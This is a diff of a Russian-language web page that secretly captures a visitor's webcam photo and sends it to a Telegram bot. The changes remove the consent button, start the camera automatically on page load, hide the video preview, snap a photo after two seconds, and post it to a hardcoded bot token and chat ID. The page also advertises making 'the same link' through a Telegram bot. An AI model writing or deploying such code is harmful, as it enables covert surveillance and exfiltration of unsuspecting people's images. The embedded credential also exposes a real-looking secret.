@@ -16,15 +16,6 @@
             padding: 15px;
             display: none;
         }
-        #startButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
         .photos-container {
             display: flex;
             justify-content: center;
@@ -52,50 +43,41 @@
         Браузер не поддерживается,<br>
         откройте через любой другой.
     </div>
-    
-    <button id="startButton">Разрешить камеру и сделать фото</button>
-    
     <div id="message" style="display: none;">
         Фото успешно отправлены.<br>
         Сделать такую же ссылку:<br>
-        <a href="https://t.me/Huysjsjakaobot">https://t.me/Huysjsjakaobot</a>
+        <a href="https://t.me/your_bot_username">https://t.me/your_bot_username</a>
         <div id="photos-container" class="photos-container"></div>
     </div>
-    
     <video id="camera" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const botToken = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
-        const chatId = "1224978194";
-        const startButton = document.getElementById('startButton');
+        // Ваши данные бота (ЗАМЕНИТЕ НА СВОИ!)
+        const botToken = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U"; // Токен вашего бота
+        const chatId = "1224978194"; // ID чата, куда отправлять фото
 
         // Проверка поддержки камеры
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             document.getElementById('unsupported').style.display = 'block';
-            startButton.style.display = 'none';
-        }
-
-        // Обработчик кнопки
-        startButton.addEventListener('click', () => {
+        } else {
+            // Захват камеры
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    startButton.style.display = 'none';
                     const video = document.getElementById('camera');
-                    video.style.display = 'block';
                     video.srcObject = stream;
-                    
                     video.onloadedmetadata = () => {
                         video.play();
                         setTimeout(capturePhoto, 2000); // Через 2 сек делает фото
                     };
                 })
                 .catch(err => {
-                    alert("Не удалось получить доступ к камере! Разрешите доступ в настройках браузера.");
                     console.error("Ошибка камеры: ", err);
+                    document.getElementById('unsupported').style.display = 'block';
                 });
-        });
+        }
 
+        // Функция захвата фото
         function capturePhoto() {
             const video = document.getElementById('camera');
             const canvas = document.getElementById('canvas');
@@ -105,12 +87,13 @@
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+            // Преобразование в Blob и отправка
             canvas.toBlob(blob => {
                 sendPhotoToTelegram(blob);
-                video.srcObject.getTracks().forEach(track => track.stop()); // Выключаем камеру
             }, 'image/jpeg', 0.9);
         }
 
+        // Отправка фото в Telegram через Bot API
         function sendPhotoToTelegram(photoBlob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -126,17 +109,20 @@
                     document.getElementById('message').style.display = 'block';
                     document.getElementById('camera').style.display = 'none';
                     
+                    // Показываем превью отправленного фото
                     const photosContainer = document.getElementById('photos-container');
                     const img = document.createElement('img');
                     img.src = URL.createObjectURL(photoBlob);
                     img.className = 'photo';
                     photosContainer.appendChild(img);
                 } else {
-                    alert("Ошибка отправки: " + JSON.stringify(data));
+                    console.error("Ошибка отправки: ", data);
+                    alert("Ошибка отправки фото!");
                 }
             })
             .catch(error => {
-                alert("Ошибка сети: " + error);
+                console.error("Ошибка: ", error);
+                alert("Ошибка сети!");
             });
         }
     </script>
